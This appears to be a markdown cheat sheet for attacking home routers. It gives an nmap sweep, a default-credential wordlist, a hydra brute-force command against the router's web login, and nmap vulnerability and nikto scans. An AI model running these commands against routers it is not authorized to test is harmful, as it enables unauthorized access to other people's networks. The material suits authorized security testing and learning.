# Network Scanning and Information Gathering

## Network Scan
###### - To scan devices on the network and save the results:
```bash
nmap -sn 192.168.1.0/24 > "/home/username/network_scan_results_$(date +%F_%T).txt"
```
###### - The "username" section is entered by default. Please enter the information according to your own username.

##### To find the default gateway:
```bash
ip route show
```

###### -  Access the router's admin panel (example):
```bash
http://192.168.1.1
```

## Router Password Cracking
###### -  To obtain the specific default password according to your router model, you can check this site.
###### - https://www.routerpasswords.com/
##### - The following command saves a list of default usernames and passwords as a wordlist for accessing the router's admin panel. However, if you have already visited the website https://www.routerpasswords.com/, this step is not necessary as the site provides the default login credentials for various router models.
###### - However, you still need to create a wordlist.
```bash
echo -e "admin:admin\nadmin:1234\nadmin:password\nroot:root\nroot:12345\nuser:user\nguest:guest" > router_wordlist.txt
```

## Brute Force and Vulnerability Scanning
##### - Brute Force Password Cracking
###### - This command attempts to brute-force the admin username with passwords from a given wordlist file on the target router's web login page (via HTTP GET method). The output is not saved or displayed, as it is directed to /dev/null.
```bash
hydra -l admin -P /home/username/wordlist.txt 192.168.1.1 http-get / -t 4 -w 30 | tee /dev/null
```
## Vulnerability Scanning
```bash
nmap --script vuln 192.168.1.1
```
```bash
nmap --script http-vuln* 192.168.1.1 | nmap --script ftp-vuln*,ssl-*,smtp-vuln* 192.168.1.1
```
###### - In the example, the address is "192.168.1.1".

## Web Interface Analysis
```bash
nikto -h http://192.168.1.1
```

### This document contains basic tools and commands for security and anonymity. It's important to follow ethical guidelines during usage.
